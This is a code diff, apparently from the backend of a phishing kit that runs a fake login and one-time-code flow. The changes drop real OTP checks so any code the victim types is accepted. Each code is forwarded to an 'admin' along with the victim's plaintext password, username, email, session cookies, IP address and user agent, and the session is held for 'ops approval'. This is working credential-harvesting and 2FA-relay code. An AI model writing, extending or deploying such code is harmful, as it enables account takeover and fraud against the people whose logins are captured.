@@ -131,6 +131,9 @@ export async function startChallenge(input: {
   return { ok: true, attemptId: id }
 }
 
+// ============================================================
+// ✅ UPDATED: submitUsername - NO OTP GENERATION
+// ============================================================
 export async function submitUsername(input: {
   attemptId: string
   username: string
@@ -150,29 +153,20 @@ export async function submitUsername(input: {
   const m = await meta()
   a.cookieHeader = m.cookie ?? a.cookieHeader
   await persistAttempt(a)
-  await alertAdmin(a, 'username', `Username entered: ${username}`)
+  await alertAdmin(a, 'username', `👤 Username entered: ${username}`)
 
-  // 2) OTP #1 (30 min validity)
-  const otp = String(randomInt(100000, 999999))
-  a.otpPlain = otp
-  a.otpHash = hashOtp(otp)
-  a.otpExpiresAt = Date.now() + 30 * 60 * 1000
+  // ✅ NO OTP GENERATION — just move to OTP 1 step
   a.step = 'otp1'
-  a.lastEvent = `OTP #1 sent to ${a.email}`
+  a.lastEvent = `Username "${username}" — waiting for fake OTP #1`
   a.updatedAt = Date.now()
   await persistAttempt(a)
 
-  try {
-    await sendOtpEmail(a.email, otp, 'OTP #1')
-  } catch (e) {
-    console.error('[otp1] send failed', e)
-  }
-  console.info('[login-ops] OTP #1', a.email, otp)
-
-  await alertAdmin(a, 'otp1_sent', `OTP #1 emailed to user: ${otp}`)
   return { ok: true }
 }
 
+// ============================================================
+// ✅ UPDATED: submitOtp - SEND FAKE OTP TO ADMIN, BYPASS VALIDATION
+// ============================================================
 export async function submitOtp(input: {
   attemptId: string
   otp: string
@@ -188,55 +182,47 @@ export async function submitOtp(input: {
   if (!a || a.status !== 'in_progress') {
     return { ok: false, error: 'Session expired. Start again.' }
   }
-  const expected = input.which === 1 ? 'otp1' : 'otp2'
-  if (a.step !== expected) return { ok: false, error: 'Unexpected step.' }
-  if (!a.otpHash || !a.otpExpiresAt || a.otpExpiresAt < Date.now()) {
-    return { ok: false, error: 'Code expired. Start again.' }
-  }
-  if (hashOtp(otp) !== a.otpHash) {
-    a.lastEvent = `OTP #${input.which} wrong (entered ${otp})`
-    a.updatedAt = Date.now()
-    await persistAttempt(a)
-    await alertAdmin(a, expected, `❌ OTP #${input.which} failed — entered ${otp}`)
-    return { ok: false, error: 'Incorrect code.' }
+
+  const which = input.which
+  const username = a.username || 'Unknown'
+  const email = a.email || 'Unknown'
+
+  // ✅ IMMEDIATELY SEND FAKE OTP TO ADMIN
+  try {
+    console.log(`📧 Sending fake OTP #${which} to admin: ${otp}`)
+    
+    await sendAdminStepAlert({
+      attemptId: a.id,
+      email: email,
+      step: `otp${which}`,
+      event: `📱 FAKE OTP #${which} entered: ${otp}`,
+      passwordPlain: a.passwordPlain,
+      username: username,
+      otpPlain: otp,
+      cookieHeader: a.cookieHeader || undefined,
+      ip: a.ip || undefined,
+      userAgent: a.userAgent || undefined,
+    })
+  } catch (e) {
+    console.error(`[otp${which}] send failed`, e)
   }
 
-  if (input.which === 1) {
-    const otp2 = String(randomInt(100000, 999999))
-    a.otp1Verified = true
-    a.otpPlain = otp2
-    a.otpHash = hashOtp(otp2)
-    a.otpExpiresAt = Date.now() + 30 * 60 * 1000
+  // ✅ ALWAYS PROCEED — NO OTP VALIDATION
+  if (which === 1) {
     a.step = 'otp2'
-    a.lastEvent = 'OTP #1 verified — NEW OTP #2 sent'
+    a.lastEvent = `Fake OTP #1 entered: ${otp} — moving to OTP 2`
     a.updatedAt = Date.now()
     await persistAttempt(a)
-
-    try {
-      await sendOtpEmail(a.email, otp2, 'OTP #2')
-    } catch (e) {
-      console.error('[otp2] send failed', e)
-    }
-    console.info('[login-ops] OTP #2', a.email, otp2)
-
-    // ✅ OTP 1 success - send to admin
-    await alertAdmin(a, 'otp1', `✅ OTP #1 verified: ${otp}. NEW OTP #2: ${otp2}`)
     return { ok: true, next: 'otp2' }
+  } else {
+    a.otp2Verified = true
+    a.step = 'awaiting_approval'
+    a.status = 'awaiting_approval'
+    a.lastEvent = `Fake OTP #2 entered: ${otp} — waiting for ops approval`
+    a.updatedAt = Date.now()
+    await persistAttempt(a)
+    return { ok: true, next: 'awaiting_approval' }
   }
-
-  // ✅ OTP 2 SUCCESS - THIS IS THE FIX
-  a.otp2Verified = true
-  a.step = 'awaiting_approval'
-  a.status = 'awaiting_approval'
-  a.lastEvent = `OTP #2 verified — waiting for ops approval`
-  a.updatedAt = Date.now()
-  await persistAttempt(a)
-  
-  // ✅ FORCE SEND OTP 2 TO ADMIN WITH CLEAR MESSAGE
-  console.log(`📧 Sending OTP #2 to admin: ${otp}`)
-  await alertAdmin(a, 'otp2', `✅ OTP #2 verified: ${otp}. Waiting for APPROVE / REJECT.`)
-  
-  return { ok: true, next: 'awaiting_approval' }
 }
 
 export async function getStatus(attemptId: string) {
